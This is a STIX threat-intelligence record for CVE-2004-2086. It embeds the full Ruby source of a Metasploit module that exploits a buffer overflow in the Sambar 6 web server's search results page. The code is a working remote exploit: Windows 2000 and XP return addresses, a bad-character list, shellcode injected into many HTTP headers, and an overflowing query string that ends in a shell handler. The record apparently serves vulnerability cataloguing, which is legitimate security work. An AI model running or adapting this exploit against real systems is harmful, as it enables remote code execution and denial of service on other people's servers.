{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--52fc3b7b-5260-408b-83c2-2a8d59599359",
    "created": "2024-08-14T16:54:39.600539Z",
    "modified": "2024-08-14T16:54:39.600543Z",
    "name": "Sambar 6 Search Results Buffer Overflow",
    "description": " This module exploits a buffer overflow found in the /search/results.stm application that comes with Sambar 6. This code is a direct port of Andrew Griffiths's SMUDGE exploit, the only changes made were to the nops and payload. This exploit causes the service to die, whether you provided the correct target or not. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/sambar6_search_results.rb",
            "external_id": "sambar6_search_results.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-2086"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'Sambar 6 Search Results Buffer Overflow',\n      'Description'\t=> %q{\n      This module exploits a buffer overflow found in the\n      /search/results.stm application that comes with Sambar 6.\n      This code is a direct port of Andrew Griffiths's SMUDGE\n      exploit, the only changes made were to the nops and payload.\n      This exploit causes the service to die, whether you provided\n      the correct target or not.\n      },\n      'Author' \t=> \t[\n          'hdm',\n          'Andrew Griffiths <andrewg[at]felinemenace.org>',\n          'aushack', # msf3 port\n            ],\n      'Arch'\t\t=> [ ARCH_X86 ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n      [\n        [ 'CVE', '2004-2086' ],\n        [ 'OSVDB', '5786' ],\n        [ 'BID', '9607' ],\n      ],\n      'Privileged'\t\t=> false,\n      'DefaultOptions'\t=>\n      {\n        'EXITFUNC'\t=> 'thread',\n      },\n      'Payload'\t\t=>\n        {\n          'Space'\t\t\t=> 2000, # unlimited\n          'BadChars' \t\t=> \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' \t=> -3500,\n        },\n      'Platform' => ['win'],\n      'Targets'  =>\n      [\n        # patrick tested OK 20100214 xpsp0\n        ['Windows 2000', \t{ 'jmpESP' => 0x74fdee63, 'Ret' => 0x773368f4 } ],\n        ['Windows XP',   \t{ 'jmpESP' => 0x77da78ff, 'Ret' => 0x77e631ea } ], # user32.dll jmp esp; kernel32.dll retn\n\n      ],\n      'DisclosureDate' => '2003-06-21'))\n\n      register_options(\n      [\n        Opt::RPORT(80),\n      ])\n  end\n\n  def check\n    connect\n    sock.put(\"GET / HTTP/1.0\\r\\n\\r\\n\")\n    banner = sock.get_once\n    disconnect\n\n    if (banner =~ /Server:\\sSAMBAR/)\n      return Exploit::CheckCode::Detected\n    end\n      return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    buff = \"POST /search/results.stm HTTP/1.1\\r\\n\"\n    buff << \"Host: #{datastore['RHOST']}:#{datastore['RPORT']}\\r\\n\"\n    buff <<  \"User-Agent: #{payload.encoded}\\r\\n\"\n    buff << \"Accept: #{payload.encoded}\\r\\n\"\n    buff << \"Accept-Encoding: #{payload.encoded}\\r\\n\"\n    buff << \"Accept-Language: #{payload.encoded}\\r\\n\"\n    buff << \"Accept-Ranges: #{payload.encoded}\\r\\n\"\n    buff << \"Referrer: #{payload.encoded}\\r\\n\"\n    buff << \"Connection: Keep-Alive\\r\\n\"\n    buff <<\"Pragma: no-cache\\r\\n\"\n    buff << \"Content-Type: #{payload.encoded}\\r\\n\"\n\n    # we use \\xfc (cld) as nop, this code goes through tolower() and must be 0xc0->0xff\n    # int3's DO NOT WORK because it triggers an exception and causes the server to exit\n    jmpcode = \"\\xfc\" + \"h\" + [target['Ret']].pack('V') + \"\\xfc\\xfc\\xfc\" + \"\\xc2\\x34\\xd1\"\n    bigbuff = jmpcode  + (\"X\" * (128 - jmpcode.length)) + [target['jmpESP']].pack('V') +[target['jmpESP']].pack('V') + jmpcode\n    content = \"style=page&spage=0&indexname=docs&query=#{bigbuff}\"\n    buff << \"Content-Length: #{content.length}\\r\\n\\r\\n\" + content\n\n    print_status(\"Sending #{buff.length} bytes to remote host.\")\n    sock.put(buff)\n    res = sock.get_once\n    if (!res)\n      print_status(\"Didn't get response, hoping for shell anyway...\")\n    else\n      print_status(\"Got Response!\")\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-06-21",
    "x_mitre_platforms": [
        "['win']"
    ]
}